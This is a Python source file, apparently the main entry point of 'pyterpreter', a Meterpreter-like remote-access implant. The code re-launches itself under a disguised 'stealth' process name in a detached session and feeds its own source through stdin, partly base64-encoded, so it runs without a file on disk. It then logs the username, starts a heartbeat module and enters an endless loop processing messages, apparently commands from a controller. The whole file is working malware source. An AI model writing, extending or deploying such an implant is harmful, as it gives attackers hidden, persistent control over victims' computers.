import base64
import os
import subprocess
import sys

from pyterpreter import config
from pyterpreter import communication
from pyterpreter import message_processor
from pyterpreter import pacemaker
from pyterpreter.my_logging import Logger


logger = Logger('ROOT')


def run():
    if os.environ.get('PYTERPRETER_PYTHON') is None:
        os.environ['PYTERPRETER_PYTHON'] = sys.executable
    else:
        sys.executable = os.environ['PYTERPRETER_PYTHON']

    if not config.HAS_STEALTH_PROCESS_NAME:
        logger.log('Spawning self again with stealth process name')
        os.environ['PYTERPRETER_HAS_STEALTH_PROCESS_NAME'] = 'YES'

        proc = subprocess.Popen([config.STEALTH_PROCESS_NAME_MAIN], stdin=subprocess.PIPE, executable=sys.executable, start_new_session=True)
        proc.stdin.write(f'globals()["__source__"] = __import__("base64").b64decode(b"{base64.b64encode(config.SOURCE_CODE.encode()).decode()}").decode()\n'.encode())
        proc.stdin.write(config.SOURCE_CODE.encode())
        proc.stdin.close()
        logger.log('parent exited')

    else:
        del os.environ['PYTERPRETER_HAS_STEALTH_PROCESS_NAME']
        pid = os.getpid()
        os.environ['PYTERPRETER_PID'] = f'{pid}'
        logger.log('\n==========================================================\n ___  _ _  ___  ___  ___  ___  ___  ___  ___  ___  ___ \n| . \\| | ||_ _|| __>| . \\| . \\| . \\| __>|_ _|| __>| . \\\n|  _/\\   / | | | _> |   /|  _/|   /| _>  | | | _> |   /\n|_|   |_|  |_| |___>|_\\_\\|_|  |_\\_\\|___> |_| |___>|_\\_\\\n                                                       \n==========================================================')
        logger.log(f'Hello from child process ({pid}) with stealth name')
        logger.log(f'username is {config.USERNAME}')

        pacemaker.start()
        communication.initialise()
        message_processor.process_messages_forever()
